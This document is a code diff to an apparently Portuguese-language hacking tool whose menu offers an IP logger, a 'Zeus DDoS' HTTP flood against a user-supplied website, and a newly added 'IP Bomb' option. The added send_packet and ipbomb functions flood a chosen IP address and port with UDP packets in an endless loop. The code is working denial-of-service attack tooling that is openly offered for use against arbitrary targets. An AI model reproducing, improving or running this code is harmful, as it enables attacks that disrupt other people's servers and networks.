@@ -5,6 +5,7 @@ import sys
 import colorama 
 import os 
 from pystyle import *
+import socket
 
 colorama.init(convert=True, autoreset=True)
 colorama.just_fix_windows_console()
@@ -40,6 +41,40 @@ curl --silent --output nul -X POST -H "Content-type: application/json" --data "{
     
 
 fetches = 0 
+packets = 0
+port = 8080
+
+
+def send_packet(ipa, port):
+    global packets
+    """Sends a packet to the specified IP address and port.
+
+    Args:
+        ip_address: The IP address to send the packet to.
+        port: The port number to send the packet to.
+        message: The message to send in the packet (string or bytes).
+    """
+    try:
+        # Create a socket object (IPv4, UDP)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        # Ensure message is in bytes format
+
+        # Send the message
+        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))
+
+    except socket.error as e:
+        print(f"Socket error: {e}")
+    finally:
+        s.close()
+def ipbomb(ip, port):
+    global packets
+    os.system('cls') if os.name == 'nt' else os.system('clear')
+    while True:
+        send_packet(ip, port)
+        packets += 1
+        sys.stdout.write(f'Packets sent: {packets} | Ip: {ip}, Port: {port}')
+    
 ascii = f"""
 {colorama.Fore.RED} ▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███ {colorama.Fore.BLUE}▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓      
 {colorama.Fore.RED}▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██{colorama.Fore.BLUE}▒▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒      
@@ -57,8 +92,10 @@ print(ascii)
 
 print(f'{colorama.Fore.RED}[1] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}IP Logger (Puxar ip){colorama.Fore.RESET}')
 print(f'{colorama.Fore.RED}[2] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Zeus DDoS (Versão 500w Rapida){colorama.Fore.RESET}')
-print(f'{colorama.Fore.RED}[3] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Sair{colorama.Fore.RESET}')
+print(f'{colorama.Fore.RED}[3] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}IP Bomb (PC Reset){colorama.Fore.RESET}')
+print(f'{colorama.Fore.RED}[4] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Sair{colorama.Fore.RESET}')
 choice = input(f'{colorama.Fore.YELLOW}$> ')
+
 async def flood(session, url):
     global fetches
     while True:
@@ -84,8 +121,16 @@ elif int(choice) == 2:
     os.system('cls') if os.name == 'nt' else os.system('clear')
     url = input("Enter your website (with https/http): ")
     asyncio.run(main())
-    
 elif int(choice) == 3:
+    hostip = input('Enter the ip: ')
+    port_input = input('Enter the port: ')
+    try:
+        port = int(port_input) if port_input else 8080
+    except ValueError:
+        print('Invalid port! Using default 8080.')
+        port = 8080
+    ipbomb(hostip, port) 
+elif int(choice) == 4:
     pass
 else:
     print('Escolha invalida!')
